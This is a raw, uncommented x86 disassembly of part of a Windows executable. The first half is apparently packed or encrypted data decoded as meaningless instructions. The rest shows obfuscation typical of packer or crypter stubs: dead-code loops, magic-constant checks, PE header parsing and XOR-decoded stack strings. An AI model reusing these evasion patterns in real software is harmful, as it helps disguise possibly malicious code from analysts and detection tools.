  423db3:	inc    ebx
  423db4:	dec    ebx
  423db5:	xlat   BYTE PTR fs:[ebx]
  423db7:	sbb    DWORD PTR [ecx+edi*4+0x3bee7618],ecx
  423dbe:	lods   eax,DWORD PTR ds:[esi]
  423dbf:	jbe    0x423d59
  423dc1:	nop
  423dc2:	inc    ebp
  423dc3:	sub    BYTE PTR [edi],dl
  423dc5:	mov    ds:0x6dedfc52,al
  423dca:	out    0xb7,al
  423dcc:	jge    0x423e0e
  423dce:	call   0x365aa4b7
  423dd3:	adc    edi,0xffffffa4
  423dd6:	pop    eax
  423dd7:	xchg   ebp,eax
  423dd8:	mov    ch,0xad
  423dda:	mov    eax,0x81aecf46
  423ddf:	popa   
  423de0:	mov    ecx,DWORD PTR [eax+0x21dce326]
  423de6:	or     dh,BYTE PTR [ebx-0x2adb86de]
  423dec:	cli    
  423ded:	inc    edx
  423dee:	sahf   
  423def:	(bad)  
  423df0:	in     al,0x10
  423df2:	into   
  423df3:	pop    ds
  423df4:	fs xchg edi,eax
  423df6:	xor    al,BYTE PTR ds:0x56aa0e4f
  423dfc:	cmp    eax,DWORD PTR [edx]
  423dfe:	mov    WORD PTR [eax],gs
  423e00:	outs   dx,BYTE PTR ds:[esi]
  423e01:	ins    BYTE PTR es:[edi],dx
  423e02:	(bad)  
  423e03:	ja     0x423e45
  423e05:	imul   edi,DWORD PTR [esi],0xb2d3a48f
  423e0b:	shl    DWORD PTR [esi-0x1acce4cb],cl
  423e11:	hlt    
  423e12:	push   edi
  423e13:	dec    ebx
  423e14:	mov    al,0x20
  423e16:	addr16 and eax,0x4dff2ef
  423e1c:	jo     0x423e32
  423e1e:	call   0xeb00:0xa4f61278
  423e25:	in     al,0xd8
  423e27:	fld    TBYTE PTR [edi-0x4cc9e760]
  423e2d:	mov    WORD PTR [edi+0x10],cs
  423e30:	sti    
  423e31:	push   edx
  423e32:	stc    
  423e33:	outs   dx,BYTE PTR ds:[esi]
  423e34:	outs   dx,DWORD PTR ds:[esi]
  423e35:	das    
  423e36:	pusha  
  423e37:	push   ebx
  423e38:	mov    eax,0xeb83b880
  423e3d:	pop    DWORD PTR [ecx-0x5c]
  423e40:	es scas al,BYTE PTR es:[edi]
  423e42:	mov    al,0x71
  423e44:	pop    edx
  423e45:	xchg   BYTE PTR [ebp-0x6e],ch
  423e48:	aaa    
  423e49:	add    eax,0x25032110
  423e4e:	lea    edi,[eax-0x19]
  423e51:	cmp    edi,DWORD PTR [edx]
  423e53:	add    DWORD PTR [ebx],0xffffffff
  423e56:	dec    ebp
  423e57:	pusha  
  423e58:	fldenv [ebx-0x4057ec9]
  423e5e:	sbb    ebp,DWORD PTR ds:0xc5688a61
  423e64:	inc    ecx
  423e65:	jmp    0x921de526
  423e6a:	dec    ecx
  423e6b:	dec    BYTE PTR [ecx-0xd]
  423e6e:	jbe    0x423edd
  423e70:	mov    ecx,DWORD PTR [ebx+0xb]
  423e73:	imul   ecx,DWORD PTR [ecx],0xa56097e2
  423e79:	push   ecx
  423e7a:	mov    esi,0xcaba7568
  423e7f:	add    ecx,DWORD PTR [ebp-0x43]
  423e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e83:	ja     0x423eb0
  423e85:	xchg   ebp,eax
  423e86:	outs   dx,BYTE PTR ds:[esi]
  423e87:	(bad)  
  423e88:	jmp    0xd806a8c8
  423e8d:	xor    DWORD PTR [edi+0x13],0x5542adb6
  423e94:	test   DWORD PTR cs:[ebx+ebp*1+0x2b],esp
  423e99:	ret    0x70d1
  423e9c:	mov    eax,0x3033f214
  423ea1:	stos   DWORD PTR es:[edi],eax
  423ea2:	fxch   st(5)
  423ea4:	mov    edi,0x4444eb55
  423ea9:	adc    eax,0xb4f1f64
  423eae:	mov    dh,0xf4
  423eb0:	cs mov eax,0xdad29bda
  423eb6:	or     eax,0x7ed98782
  423ebb:	test   al,0x3a
  423ebd:	ss inc ebp
  423ebf:	aaa    
  423ec0:	mov    eax,0x4c044827
  423ec5:	adc    edx,ebp
  423ec7:	or     bl,BYTE PTR [ebx]
  423ec9:	mov    edx,edx
  423ecb:	lods   eax,DWORD PTR ds:[esi]
  423ecc:	fsubr  QWORD PTR ss:[ebx+0x62828ad5]
  423ed3:	sub    eax,0xb456cce0
  423ed8:	push   ebp
  423ed9:	mov    ah,0x35
  423edb:	mov    dh,0x6
  423edd:	mov    edx,0x18beaf43
  423ee2:	cmp    DWORD PTR [ebp+0xa],esi
  423ee5:	pop    DWORD PTR [ebp+0xd]
  423ee8:	pushf  
  423ee9:	std    
  423eea:	push   cs
  423eeb:	and    al,0xa0
  423eed:	adc    ch,BYTE PTR [edi+edx*2+0x4a]
  423ef1:	or     dl,bl
  423ef3:	fmul   QWORD PTR [edi]
  423ef5:	cmc    
  423ef6:	inc    esp
  423ef7:	push   esp
  423ef8:	pop    ebp
  423ef9:	jbe    0x423f4a
  423efb:	mov    ds:0x699f8c3c,eax
  423f00:	call   0xa8e1:0x390ec9a9
  423f07:	fwait
  423f08:	cmp    DWORD PTR [esi-0x6f],eax
  423f0b:	pop    eax
  423f0c:	xchg   edi,eax
  423f0d:	adc    al,0x53
  423f0f:	add    bh,dh
  423f11:	in     al,0x3d
  423f13:	push   eax
  423f14:	test   DWORD PTR [ecx],esi
  423f16:	test   esi,0x616666db
  423f1c:	mov    ebx,0xef94a9a3
  423f21:	cld    
  423f22:	dec    esp
  423f23:	adc    al,0x76
  423f25:	fcomip st,st(5)
  423f27:	cld    
  423f28:	xor    al,0x6a
  423f2a:	jo     0x423ec6
  423f2c:	fsubr  DWORD PTR [edx+0x30a3934f]
  423f32:	aad    0x95
  423f34:	dec    al
  423f36:	into   
  423f37:	dec    edx
  423f38:	test   BYTE PTR [ecx+edx*1-0x21],ch
  423f3c:	mov    ecx,0x9e4b65d0
  423f41:	push   ss
  423f42:	add    edi,eax
  423f44:	into   
  423f45:	jns    0x423f06
  423f47:	mov    dl,0x44
  423f49:	or     dh,al
  423f4b:	and    al,0x99
  423f4d:	outs   dx,DWORD PTR ds:[esi]
  423f4e:	les    edi,FWORD PTR [esi]
  423f50:	sbb    al,0x5f
  423f52:	scas   al,BYTE PTR es:[edi]
  423f53:	ja     0x423f26
  423f55:	jp     0x423fab
  423f57:	stos   DWORD PTR es:[edi],eax
  423f58:	pop    eax
  423f59:	in     eax,dx
  423f5a:	mov    bh,0x3a
  423f5c:	ret    
  423f5d:	add    ch,dl
  423f5f:	imul   esi,DWORD PTR [ebp+0x6536db66],0x53b8471f
  423f69:	or     di,WORD PTR [ebp+esi*1-0x683f8eec]
  423f71:	or     DWORD PTR [ecx],ebp
  423f73:	dec    eax
  423f74:	mov    dh,0xb2
  423f76:	fs push ecx
  423f78:	inc    ecx
  423f79:	cmp    DWORD PTR [ebx],eax
  423f7b:	xchg   esi,eax
  423f7c:	stos   BYTE PTR es:[edi],al
  423f7d:	ret    0x2082
  423f80:	rol    dh,0xf9
  423f83:	stos   BYTE PTR es:[edi],al
  423f84:	lea    ebx,[ecx-0x29]
  423f87:	pusha  
  423f88:	xor    BYTE PTR [edx+0x78],ah
  423f8b:	lea    edi,[esi+0x398553ef]
  423f91:	retf   0x7860
  423f94:	push   0x16f083f6
  423f99:	mov    ch,0xbc
  423f9b:	mov    esp,0x364ac42c
  423fa0:	aad    0x14
  423fa2:	mov    ah,0x80
  423fa4:	mov    al,ds:0xa312126a
  423fa9:	call   0xec14:0x83a7c01b
  423fb0:	dec    edx
  423fb1:	retf   0xe95b
  423fb4:	out    0x34,eax
  423fb6:	scas   eax,DWORD PTR es:[edi]
  423fb7:	xchg   ebp,eax
  423fb8:	(bad)  
  423fb9:	jno    0x423fa1
  423fbb:	mov    edi,0xfceb0a4e
  423fc0:	cli    
  423fc1:	fldenv [eax]
  423fc3:	sub    eax,0xb6e24e6e
  423fc8:	inc    edx
  423fc9:	xor    ebx,DWORD PTR [edx-0x40]
  423fcc:	jmp    0xe2d1:0x611d64ea
  423fd3:	test   BYTE PTR [esi],dh
  423fd5:	xor    al,0x46
  423fd7:	in     eax,0x24
  423fd9:	out    0x6f,al
  423fdb:	das    
  423fdc:	mov    eax,0xa739ff08
  423fe1:	js     0x423ffe
  423fe3:	in     al,dx
  423fe4:	add    ebx,edx
  423fe6:	pop    esp
  423fe7:	push   ecx
  423fe8:	test   al,0x78
  423fea:	add    eax,0x54bde1f9
  423fef:	sub    ch,BYTE PTR [ebp-0x272a86e2]
  423ff5:	call   0xf138:0x8d763f
  423ffc:	cmp    BYTE PTR [ebx],dh
  423ffe:	or     ah,ch
  424000:	pop    ds
  424001:	sar    BYTE PTR [ecx+0x34],1
  424004:	jle    0x423fff
  424006:	sub    dh,BYTE PTR [edi]
  424008:	fcomi  st,st(4)
  42400a:	cwde   
  42400b:	out    dx,al
  42400c:	sub    bh,BYTE PTR es:[edx+0x24]
  424010:	pop    edi
  424011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424012:	jecxz  0x424025
  424014:	frstor [ecx-0x26]
  424017:	mov    ah,0x18
  424019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42401a:	mov    dh,0x46
  42401c:	mul    DWORD PTR [edi+ebx*1-0x76]
  424020:	jne    0x42404e
  424022:	bound  ecx,QWORD PTR [eax-0x5c]
  424025:	dec    edx
  424026:	or     eax,0xc5c1c86b
  42402b:	shl    ch,0x24
  42402e:	fsub   QWORD PTR [eax-0x3a]
  424031:	xor    al,0x75
  424033:	mov    esi,0x1e884612
  424038:	inc    ecx
  424039:	push   ebx
  42403a:	movups xmm4,xmm0
  42403d:	pop    es
  42403e:	mov    eax,0x7ec394aa
  424043:	jae    0x423fe1
  424045:	imul   ebp,DWORD PTR [edx+0x9],0x3d
  424049:	mov    ch,0xda
  42404b:	sti    
  42404c:	jae    0x4240b0
  42404e:	ins    DWORD PTR es:[edi],dx
  42404f:	scas   eax,DWORD PTR es:[edi]
  424050:	lds    esi,FWORD PTR [eax-0x78]
  424053:	std    
  424054:	clc    
  424055:	and    cl,BYTE PTR [ecx+0x363fc420]
  42405b:	ds add ebx,ebx
  42405e:	dec    eax
  42405f:	and    BYTE PTR [esi],cl
  424061:	or     al,0x20
  424063:	and    eax,0x3f83c94e
  424068:	xlat   BYTE PTR ds:[ebx]
  424069:	out    0xf9,al
  42406b:	jbe    0x42403f
  42406d:	into   
  42406e:	int    0x51
  424070:	clc    
  424071:	jmp    0x8891:0xc7b6086d
  424078:	in     eax,dx
  424079:	pop    ecx
  42407a:	pop    esp
  42407b:	out    dx,al
  42407c:	xor    ch,BYTE PTR [ecx]
  42407e:	mov    eax,ds:0xbb832a39
  424083:	imul   ah
  424085:	icebp  
  424086:	nop
  424087:	dec    ebx
  424088:	add    al,0xf5
  42408a:	push   edx
  42408b:	inc    ecx
  42408c:	int    0xf8
  42408e:	repnz shl BYTE PTR ds:0xa97098e5,1
  424095:	loop   0x424098
  424097:	or     al,0x5e
  424099:	and    DWORD PTR [edx],esi
  42409b:	call   0xbd9ea116
  4240a0:	ret    
  4240a1:	test   eax,0x348e6f45
  4240a6:	dec    edi
  4240a7:	dec    edi
  4240a8:	aas    
  4240a9:	fldenv [ebx+0x38]
  4240ac:	jmp    0xa62fe3ee
  4240b1:	fdivr  QWORD PTR [edi]
  4240b3:	test   BYTE PTR [edx+eiz*8+0x1e58bd27],al
  4240ba:	xchg   ebx,eax
  4240bb:	repnz dec edi
  4240bd:	inc    eax
  4240be:	das    
  4240bf:	xor    BYTE PTR [ebx-0x3b],al
  4240c2:	arpl   WORD PTR [ecx],si
  4240c4:	mov    ebp,0x591c0748
  4240c9:	inc    ebx
  4240ca:	jmp    0x5e6ed014
  4240cf:	and    al,0xc
  4240d1:	sub    bh,BYTE PTR [ebp+0x7f]
  4240d4:	push   0xfffffff2
  4240d6:	cwde   
  4240d7:	push   0x65
  4240d9:	push   edx
  4240da:	xor    eax,0x873ace96
  4240df:	stos   DWORD PTR es:[edi],eax
  4240e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240e1:	and    cl,BYTE PTR [ecx-0x6c]
  4240e4:	inc    ebp
  4240e5:	gs mov ecx,0x32ea107c
  4240eb:	jmp    0xa3034975
  4240f0:	inc    esp
  4240f1:	loopne 0x424133
  4240f3:	inc    ebp
  4240f4:	sub    BYTE PTR [ecx+0x191c4e75],0x28
  4240fb:	sub    esi,DWORD PTR [edx]
  4240fd:	mov    ch,0x50
  4240ff:	scas   al,BYTE PTR es:[edi]
  424100:	xchg   esi,eax
  424101:	jle    0x42409f
  424103:	inc    esi
  424104:	xchg   ebx,eax
  424105:	xchg   edx,eax
  424106:	and    DWORD PTR [edi-0x80],ecx
  424109:	push   ds
  42410a:	jae    0x4240e0
  42410c:	xchg   edx,eax
  42410d:	outs   dx,BYTE PTR es:[esi]
  42410f:	mov    ebp,esp
  424111:	xchg   edx,eax
  424112:	sahf   
  424113:	mov    ebx,0x19871ce4
  424118:	jns    0x424108
  42411a:	ins    DWORD PTR es:[edi],dx
  42411b:	addr16 xchg ecx,eax
  42411d:	pop    eax
  42411e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42411f:	jg     0x424133
  424121:	cmp    edi,0xe77b9deb
  424127:	(bad)  [ebp+0x73]
  42412a:	pop    esp
  42412b:	inc    edi
  42412c:	in     eax,0x87
  42412e:	mov    ds:0xc6186e7c,al
  424133:	push   ds
  424134:	adc    eax,esi
  424136:	dec    ebx
  424137:	or     eax,0x6641d62b
  42413c:	stc    
  42413d:	sar    BYTE PTR [esi-0x44],1
  424140:	(bad)  
  424142:	mov    DWORD PTR [ebp-0x7a5d47f6],edi
  424148:	pushf  
  424149:	clc    
  42414a:	pop    ebx
  42414b:	pop    edi
  42414c:	pop    esi
  42414d:	leave  
  42414e:	ret    0xc
  424151:	push   ebp
  424152:	mov    ebp,esp
  424154:	push   ecx
  424155:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  42415c:	mov    DWORD PTR ds:0x4291bb,0x19
  424166:	cmp    DWORD PTR ds:0x4291bb,0x0
  42416d:	je     0x4241c3
  424173:	cmp    DWORD PTR ds:0x4291bb,0x5
  42417a:	jb     0x4241c3
  424180:	jmp    0x424195
  424185:	push   0x6cdd
  42418a:	push   0x428019
  42418f:	call   DWORD PTR ds:0x42a7a7
  424195:	cmp    DWORD PTR ds:0x4291bb,0x6
  42419c:	jne    0x4241b1
  4241a2:	xor    ecx,ecx
  4241a4:	xor    ecx,DWORD PTR ds:0x4291bb
  4241aa:	dec    ecx
  4241ab:	mov    DWORD PTR ds:0x4291bb,ecx
  4241b1:	mov    ecx,DWORD PTR ds:0x4291bb
  4241b7:	dec    ecx
  4241b8:	mov    DWORD PTR ds:0x4291bb,ecx
  4241be:	jmp    0x424166
  4241c3:	mov    eax,DWORD PTR [ebp+0x8]
  4241c6:	or     ecx,ecx
  4241c8:	movsx  eax,BYTE PTR [eax]
  4241cb:	or     ecx,0x305b
  4241d1:	mov    edx,0x3272f3
  4241d6:	add    DWORD PTR ds:0x4291c7,0x4291f7
  4241e0:	sub    eax,edx
  4241e2:	mov    DWORD PTR ds:0x4291a7,0x1e
  4241ec:	cmp    DWORD PTR ds:0x4291a7,0x0
  4241f3:	je     0x42424b
  4241f9:	cmp    DWORD PTR ds:0x4291a7,0x6
  424200:	jl     0x42424b
  424206:	jmp    0x42421d
  42420b:	push   0x4280f2
  424210:	push   0x1
  424212:	push   0x8730
  424217:	call   DWORD PTR ds:0x42a7af
  42421d:	cmp    DWORD PTR ds:0x4291a7,0x7
  424224:	jne    0x424237
  42422a:	mov    ecx,DWORD PTR ds:0x4291a7
  424230:	dec    ecx
  424231:	mov    DWORD PTR ds:0x4291a7,ecx
  424237:	xor    ecx,ecx
  424239:	add    ecx,DWORD PTR ds:0x4291a7
  42423f:	dec    ecx
  424240:	mov    DWORD PTR ds:0x4291a7,ecx
  424246:	jmp    0x4241ec
  42424b:	mov    ecx,0x75108ac
  424250:	xor    eax,ecx
  424252:	cmp    eax,0xf89c85f6
  424257:	jne    0x424286
  42425d:	mov    eax,DWORD PTR [ebp+0x8]
  424260:	push   esi
  424261:	mov    esi,DWORD PTR [ebp+0x8]
  424264:	add    esi,DWORD PTR [eax+0x3c]
  424267:	mov    DWORD PTR [ebp+0x8],esi
  42426a:	mov    eax,DWORD PTR [ebp-0x4]
  42426d:	mov    esi,DWORD PTR [ebp+0x8]
  424270:	xor    eax,ecx
  424272:	add    eax,edx
  424274:	cmp    DWORD PTR [esi+0x54],eax
  424277:	pop    esi
  424278:	je     0x424286
  42427e:	mov    eax,DWORD PTR [ebp+0x8]
  424281:	jmp    0x42428d
  424286:	mov    eax,DWORD PTR [ebp-0x4]
  424289:	xor    eax,ecx
  42428b:	add    eax,edx
  42428d:	leave  
  42428e:	ret    0x4
  424291:	push   ebp
  424292:	mov    ebp,esp
  424294:	sub    esp,0xc
  424297:	and    DWORD PTR ds:0x429157,0x0
  4242a1:	mov    edx,DWORD PTR ds:0x429157
  4242a7:	inc    edx
  4242a8:	mov    DWORD PTR ds:0x429157,edx
  4242ae:	cmp    DWORD PTR ds:0x429157,0x16
  4242b5:	jl     0x4242d6
  4242bb:	jmp    0x4242c9
  4242c0:	push   DWORD PTR [ebp-0x14]
  4242c3:	call   DWORD PTR ds:0x42a7b3
  4242c9:	cmp    DWORD PTR ds:0x429157,0x13
  4242d0:	jb     0x4242a1
  4242d6:	push   esi
  4242d7:	mov    esi,0xf89c85a1
  4242dc:	mov    edx,DWORD PTR ds:0x429fff
  4242e2:	mov    ecx,DWORD PTR ds:0x42a007
  4242e8:	sub    edx,ecx
  4242ea:	sub    edx,DWORD PTR [edx+ecx*1]
  4242ed:	mov    DWORD PTR [ebp-0x8],esi
  4242f0:	and    DWORD PTR ds:0x4291bf,0x59ca
  4242fa:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424301:	sub    edx,DWORD PTR ds:0x4291df
  424307:	push   edi
  424308:	and    DWORD PTR ds:0x4291c7,0x0
  424312:	jmp    0x424326
  424317:	xor    ecx,ecx
  424319:	or     ecx,DWORD PTR ds:0x4291c7
  42431f:	inc    ecx
  424320:	mov    DWORD PTR ds:0x4291c7,ecx
  424326:	cmp    DWORD PTR ds:0x4291c7,0x1f
  42432d:	jae    0x42435b
  424333:	cmp    DWORD PTR ds:0x4291c7,0x20
  42433a:	jbe    0x42435b
  424340:	jmp    0x424356
  424345:	push   0x42803d
  42434a:	push   DWORD PTR [ebp-0x20]
  42434d:	push   DWORD PTR [ebp-0x24]
  424350:	call   DWORD PTR ds:0x42a7b7
  424356:	jmp    0x424317
  42435b:	mov    eax,eax
  42435d:	and    DWORD PTR ds:0x42919b,0x3c1b
  424367:	mov    eax,DWORD PTR [ebp-0x4]
  42436a:	add    DWORD PTR ds:0x4291df,0x7092
  424374:	mov    edi,DWORD PTR [ebp-0x8]
  424377:	adc    DWORD PTR ds:0x429193,edx
  42437d:	mov    ecx,0x75108ac
  424382:	mov    edx,DWORD PTR ds:0x42917b
  424388:	and    DWORD PTR ds:0x4291e7,edx
  42438e:	xor    eax,ecx
  424390:	add    DWORD PTR ds:0x4291df,0x314e
  42439a:	xor    edi,ecx
  42439c:	mov    edx,DWORD PTR ds:0x429feb
  4243a2:	mov    edx,DWORD PTR [edx]
  4243a4:	adc    DWORD PTR ds:0x4291ab,edx
  4243aa:	mov    edx,0x3272f3
  4243af:	add    edi,edx
  4243b1:	add    eax,edx
  4243b3:	imul   eax,edi
  4243b6:	mov    edi,DWORD PTR [ebp+0xc]
  4243b9:	cmp    edi,eax
  4243bb:	je     0x424410
  4243c1:	mov    DWORD PTR [ebp-0xc],esi
  4243c4:	mov    eax,DWORD PTR [ebp-0xc]
  4243c7:	mov    esi,DWORD PTR [ebp+0xc]
  4243ca:	xor    eax,ecx
  4243cc:	lea    eax,[eax*8+0x1939810]
  4243d3:	mov    eax,DWORD PTR [esi+eax*1]
  4243d6:	mov    DWORD PTR [ebp+0xc],eax
  4243d9:	mov    eax,DWORD PTR [ebp-0x4]
  4243dc:	mov    esi,DWORD PTR [ebp-0x8]
  4243df:	xor    eax,ecx
  4243e1:	xor    esi,ecx
  4243e3:	add    esi,edx
  4243e5:	add    eax,edx
  4243e7:	imul   eax,esi
  4243ea:	mov    esi,DWORD PTR [ebp+0xc]
  4243ed:	cmp    esi,eax
  4243ef:	je     0x424410
  4243f5:	mov    eax,DWORD PTR [ebp-0x4]
  4243f8:	xor    eax,ecx
  4243fa:	mov    ecx,DWORD PTR [ebp+0xc]
  4243fd:	add    eax,edx
  4243ff:	imul   eax,ecx
  424402:	add    eax,DWORD PTR [ebp+0x8]
  424405:	mov    DWORD PTR [ebp+0xc],eax
  424408:	mov    eax,DWORD PTR [ebp+0xc]
  42440b:	jmp    0x424421
  424410:	mov    eax,DWORD PTR [ebp-0x4]
  424413:	mov    esi,DWORD PTR [ebp-0x8]
  424416:	xor    esi,ecx
  424418:	xor    eax,ecx
  42441a:	add    esi,edx
  42441c:	add    eax,edx
  42441e:	imul   eax,esi
  424421:	pop    edi
  424422:	pop    esi
  424423:	leave  
  424424:	ret    0x8
	...
  424433:	add    BYTE PTR [ebx],dl
  424435:	push   esp
  424436:	test   BYTE PTR [ebp+0x0],cl
  424439:	add    BYTE PTR [eax],al
  42443b:	add    BYTE PTR [edx],al
  42443d:	add    BYTE PTR [eax],al
  42443f:	add    BYTE PTR [eax],dh
  424441:	add    BYTE PTR [eax],al
  424443:	add    BYTE PTR [eax+0x44],dl
  424446:	add    al,BYTE PTR [eax]
  424448:	push   eax
  424449:	cmp    BYTE PTR [edx],al
  42444b:	add    BYTE PTR [eax],al
  42444d:	add    BYTE PTR [eax],al
  42444f:	add    BYTE PTR [edx+0x53],dl
  424452:	inc    esp
  424453:	push   ebx
  424454:	call   0xed8747f4
  424459:	fstp   QWORD PTR [eax+0x46]
  42445c:	mov    ds,WORD PTR [edi-0x43]
  42445f:	mov    ss,WORD PTR [eax*1+0x1df4f]
  424466:	add    BYTE PTR [eax],al
  424468:	inc    esi
  424469:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  42446d:	outs   dx,BYTE PTR ds:[esi]
  42446e:	outs   dx,DWORD PTR fs:[esi]
  424470:	ja     0x4244e5
  424472:	and    BYTE PTR [ecx+ebp*2+0x72],al
  424476:	pop    esp
  424477:	inc    esi
  424478:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  424480:	mov    edx,DWORD PTR [ebp-0x14]
  424483:	sub    esp,0x108
  424489:	push   ebx
  42448a:	mov    eax,ebx
  42448c:	xchg   ecx,eax
  42448d:	mov    eax,DWORD PTR [ebp+0x8]
  424490:	cmp    eax,0xf89c85a1
  424495:	jne    0x424952
  42449b:	mov    eax,DWORD PTR [ebp+0xc]
  42449e:	cmp    eax,0xf89c85a2
  4244a3:	jne    0x424952
  4244a9:	mov    eax,DWORD PTR [ebp+0x24]
  4244ac:	mov    DWORD PTR [ebp-0x4],eax
  4244af:	mov    eax,DWORD PTR [ebp-0x4]
  4244b2:	mov    eax,DWORD PTR [eax+0x1d8]
  4244b8:	mov    eax,DWORD PTR [eax]
  4244ba:	mov    eax,DWORD PTR [eax]
  4244bc:	mov    DWORD PTR [ebp-0x8],eax
  4244bf:	mov    BYTE PTR [ebp-0x18],0x18
  4244c3:	mov    BYTE PTR [ebp-0x17],0x1f
  4244c7:	mov    BYTE PTR [ebp-0x16],0x1a
  4244cb:	mov    BYTE PTR [ebp-0x15],0x4c
  4244cf:	mov    BYTE PTR [ebp-0x14],0x4d
  4244d3:	mov    BYTE PTR [ebp-0x13],0x83
  4244d7:	mov    BYTE PTR [ebp-0x20],0xe
  4244db:	mov    BYTE PTR [ebp-0x1f],0xc
  4244df:	mov    BYTE PTR [ebp-0x1e],0x1e
  4244e3:	mov    BYTE PTR [ebp-0x1d],0xd
  4244e7:	mov    BYTE PTR [ebp-0x1c],0x4c
  4244eb:	mov    BYTE PTR [ebp-0x1b],0x4d
  4244ef:	mov    BYTE PTR [ebp-0x1a],0x83
  4244f3:	mov    BYTE PTR [ebp-0x28],0xc
  4244f7:	mov    BYTE PTR [ebp-0x27],0x1b
  4244fb:	mov    BYTE PTR [ebp-0x26],0x17
  4244ff:	mov    BYTE PTR [ebp-0x25],0x8
  424503:	mov    BYTE PTR [ebp-0x24],0x22
  424507:	mov    BYTE PTR [ebp-0x23],0x13
  42450b:	mov    BYTE PTR [ebp-0x22],0x1a
  42450f:	mov    BYTE PTR [ebp-0x21],0x83
  424513:	xor    ecx,ecx
  424515:	lea    eax,[ebp+ecx*1-0x18]
  424519:	movzx  edx,BYTE PTR [eax]
  42451c:	xor    edx,0x7d
  42451f:	add    edx,0x2
  424522:	inc    ecx
  424523:	mov    BYTE PTR [eax],dl
  424525:	cmp    ecx,0x6
  424528:	jb     0x424515
  42452a:	xor    ecx,ecx
  42452c:	lea    eax,[ebp+ecx*1-0x20]
  424530:	movzx  edx,BYTE PTR [eax]
  424533:	xor    edx,0x7d
  424536:	add    edx,0x2
  424539:	inc    ecx
  42453a:	mov    BYTE PTR [eax],dl
  42453c:	cmp    ecx,0x7
  42453f:	jb     0x42452c
  424541:	xor    ecx,ecx
  424543:	lea    eax,[ebp+ecx*1-0x28]
  424547:	movzx  edx,BYTE PTR [eax]
  42454a:	xor    edx,0x7d
  42454d:	add    edx,0x2
  424550:	inc    ecx
  424551:	mov    BYTE PTR [eax],dl
  424553:	cmp    ecx,0x8
  424556:	jb     0x424543
  424558:	lea    eax,[ebp-0x2c]
  42455b:	mov    DWORD PTR [ebp-0x8],eax
  42455e:	mov    ecx,DWORD PTR [ebp-0x8]
  424561:	mov    eax,0x7113fccf
  424566:	mov    DWORD PTR [ecx],eax
  424568:	mov    ecx,DWORD PTR [ebp-0x2c]
  42456b:	push   esi
  42456c:	push   edi
  42456d:	mov    esi,0x4e3c
  424572:	mov    ebx,0x3272f3
  424577:	cmp    ecx,eax
  424579:	jne    0x424644
  42457f:	lea    eax,[esi+0x3b]
  424582:	mov    WORD PTR [ebp-0x78],ax
  424586:	mov    eax,esi
  424588:	mov    WORD PTR [ebp-0x76],ax
  42458c:	add    eax,0x35
  42458f:	mov    WORD PTR [ebp-0x74],ax
  424593:	lea    eax,[esi+0x2]
  424596:	mov    WORD PTR [ebp-0x72],ax
  42459a:	add    eax,0x41
  42459d:	mov    ecx,eax
  42459f:	lea    eax,[esi-0x13]
  4245a2:	mov    WORD PTR [ebp-0x66],ax
  4245a6:	mov    eax,esi
  4245a8:	mov    WORD PTR [ebp-0x64],ax
  4245ac:	add    eax,0xffffffec
  4245af:	mov    WORD PTR [ebp-0x62],ax
  4245b3:	mov    eax,0x443
  4245b8:	mov    WORD PTR [ebp-0x60],ax
  4245bc:	mov    eax,0x5672
  4245c1:	mov    WORD PTR [ebp-0x5e],ax
  4245c5:	mov    eax,0x6112
  4245ca:	mov    WORD PTR [ebp-0x5c],ax
  4245ce:	lea    eax,[ebp-0xe0]
  4245d4:	push   eax
  4245d5:	mov    eax,DWORD PTR [ebp+0xc]
  4245d8:	mov    edi,0x75108ac
  4245dd:	xor    eax,edi
  4245df:	add    eax,ebx
  4245e1:	push   eax
  4245e2:	mov    WORD PTR [ebp-0x70],cx
  4245e6:	lea    ecx,[esi-0xa]
  4245e9:	mov    edx,ecx
  4245eb:	lea    eax,[ebp-0x78]
  4245ee:	push   eax
  4245ef:	mov    eax,DWORD PTR [ebp-0x4]
  4245f2:	mov    eax,DWORD PTR [eax+0x198]
  4245f8:	mov    WORD PTR [ebp-0x6e],dx
  4245fc:	mov    edx,0x4f88
  424601:	mov    WORD PTR [ebp-0x6c],dx
  424605:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  42460c:	mov    DWORD PTR [ebp-0x5a],0x4e32f1e4
  424613:	mov    DWORD PTR [ebp-0xe0],0x1
  42461d:	mov    DWORD PTR [ebp-0xdc],0x255
  424627:	push   DWORD PTR [eax]
  424629:	mov    eax,DWORD PTR [ebp+0x10]
  42462c:	call   eax
  42462e:	mov    DWORD PTR [ebp-0x8],eax
  424631:	mov    eax,DWORD PTR [ebp-0x8]
  424634:	test   eax,eax
  424636:	je     0x424649
  424638:	xor    DWORD PTR ds:0x76586876,0x87687666
  424642:	jmp    0x424649
  424644:	mov    edi,0x75108ac
  424649:	mov    eax,DWORD PTR [ebp-0x4]
  42464c:	mov    ecx,DWORD PTR [eax+0x18c]
  424652:	xor    eax,eax
  424654:	cmp    DWORD PTR [ecx],eax
  424656:	jne    0x4248c5
  42465c:	mov    ecx,DWORD PTR [ebp-0x4]
  42465f:	mov    ecx,DWORD PTR [ecx+0x17c]
  424665:	mov    DWORD PTR [ecx],eax
  424667:	mov    ecx,DWORD PTR [ebp-0x4]
  42466a:	mov    ecx,DWORD PTR [ecx+0x180]
  424670:	mov    DWORD PTR [ecx],eax
  424672:	mov    eax,0x4e61
  424677:	mov    WORD PTR [ebp-0x9c],ax
  42467e:	mov    eax,esi
  424680:	mov    WORD PTR [ebp-0x9a],ax
  424687:	mov    eax,0x4e71
  42468c:	mov    WORD PTR [ebp-0x98],ax
  424693:	add    eax,0xffffffc0
  424696:	mov    WORD PTR [ebp-0x96],ax
  42469d:	mov    eax,0x4f8c
  4246a2:	mov    WORD PTR [ebp-0x94],ax
  4246a9:	mov    eax,0x4e30
  4246ae:	mov    WORD PTR [ebp-0x92],ax
  4246b5:	add    eax,0x4f
  4246b8:	mov    WORD PTR [ebp-0x90],ax
  4246bf:	mov    eax,0x4e32
  4246c4:	mov    WORD PTR [ebp-0x8e],ax
  4246cb:	mov    eax,esi
  4246cd:	mov    WORD PTR [ebp-0x8c],ax
  4246d4:	mov    eax,0x4e35
